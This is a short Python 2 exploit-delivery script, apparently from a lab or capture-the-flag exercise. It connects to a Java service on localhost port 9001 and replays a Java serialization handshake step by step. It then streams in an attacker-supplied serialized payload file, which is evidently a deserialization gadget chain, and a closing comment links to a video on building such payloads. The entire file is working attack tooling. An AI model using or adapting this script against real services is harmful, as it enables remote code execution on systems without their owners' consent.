#!/usr/bin/python
# Socket: Needed to send data to the port socket of the target host.
# Sys: Needed to exit the python program if we are unable to connect to the target host.
import socket, sys



#1. client: aced0005
#2. server: aced0005
#3. server: 7704
#4. server: f000baaa
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9001))
s.send('\xac\xed\x00\x05')
response = s.recv(4)
print('Received #2: ' + response)
response = s.recv(2).encode('hex')
print('Received #3: ' + response)
response = s.recv(4).encode('hex')
print('Received #4: ' + response)

#5. client: 7704
s.send('\x77\x04')
#6. client: f000baaa
s.send('\xf0\x00\xba\xaa')
#7. server: 7702
response = s.recv(2).encode('hex')
print('Received #7 ' + response)
#8. server: 0101
response = s.recv(2).encode('hex')
print('Received #8 ' + response)
#i. client: 7702
s.send('\x77\x02')
#10. client: 0101
s.send('\x01\x01')
#11. client: 77 followed by the lenght of the string for the name + 2. So, 07 for five character 'Henry' name.
s.send('\x77\x07\x00\x05')
s.send('Henry')
#12. client: hex version of client name
#s.send('Henry')
#13. client: Beginning of class definiton for value -> 737.....001
#14. client: 787....000
#15+. Doesn't matter.
payload_file = sys.argv[1] 
payload = ""
with open(payload_file, 'rb') as content_file:
	payload = content_file.read()
s.send(payload[4:])


# Create your own payload: https://youtu.be/krC5j1Ab44I?t=1985 
